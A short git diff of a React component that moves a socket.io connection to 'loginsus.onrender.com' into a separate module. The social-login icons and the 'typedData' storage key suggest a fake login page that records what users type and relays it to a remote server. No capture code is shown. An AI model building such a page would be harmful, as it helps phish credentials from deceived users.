@@ -1,8 +1,8 @@
 import React, { useState, useEffect } from "react";
-import io from "socket.io-client";
 import { FaGoogle, FaFacebook, FaInstagram, FaPhone } from "react-icons/fa";
 
-const socket = io("https://loginsus.onrender.com");
+import socket from "./socket";
+
 const STORAGE_KEY = "typedData";
 const EXPIRY_MS = 24 * 60 * 60 * 1000; // 1 din
 
